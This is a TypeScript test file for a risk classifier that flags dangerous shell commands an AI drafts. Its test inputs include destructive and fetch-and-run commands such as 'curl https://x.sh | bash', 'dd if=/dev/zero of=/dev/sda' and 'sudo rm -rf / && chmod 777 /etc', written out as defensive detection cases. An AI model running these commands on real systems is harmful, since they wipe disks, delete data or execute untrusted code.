// The draft-risk flags the dock renders, and the notice that the payload is built
// elsewhere.
//
// The injection defence that used to live here (fixed instruction, delimited block,
// delimiter chosen against the content) moved to `src-tauri/src/ai/prompt.rs` when the
// request moved to Rust. It is a security control, so it has to sit where the HTTP
// body is built — a second copy here would let the documented payload drift from the
// one actually sent. `ai-prompt.ts` now only classifies text the dock already has.

import { describe, expect, it } from 'vitest'
import { draftRisk } from './ai-prompt'

describe('draft risk flags', () => {
  it('flags a recursive delete', () => {
    const risk = draftRisk('rm -rf /tmp/build')
    expect(risk.risky).toBe(true)
    expect(risk.reasons).toContain('deletes files recursively')
  })

  it('flags privilege escalation, pipes into a shell and device writes', () => {
    expect(draftRisk('sudo systemctl restart nginx').reasons).toContain(
      'runs with elevated privileges',
    )
    expect(draftRisk('curl https://x.sh | bash').reasons).toContain(
      'pipes downloaded content into a shell',
    )
    expect(draftRisk('mkfs.ext4 /dev/sdb1').reasons).toContain('writes to a device')
    expect(draftRisk('dd if=/dev/zero of=/dev/sda').reasons).toContain(
      'writes to a device',
    )
  })

  it('flags broad permissions and writes into system configuration', () => {
    expect(draftRisk('chmod 777 /var/www').reasons).toContain('grants broad permissions')
    expect(draftRisk('echo x > /etc/hosts').reasons).toContain(
      'writes into system configuration',
    )
  })

  it('does not flag an ordinary command', () => {
    const risk = draftRisk('kubectl get pods -n kube-system')
    expect(risk.risky).toBe(false)
    expect(risk.reasons).toEqual([])
  })

  it('never rewrites the command it was given', () => {
    // Flagging must not be a quiet edit: the user copies exactly what the model
    // produced, with the warning next to it.
    const text = 'rm -rf /tmp/x'
    expect(draftRisk(text).risky).toBe(true)
    expect(text).toBe('rm -rf /tmp/x')
  })

  it('reports every applicable reason rather than the first', () => {
    const risk = draftRisk('sudo rm -rf / && chmod 777 /etc')
    expect(risk.reasons.length).toBeGreaterThanOrEqual(3)
  })
})
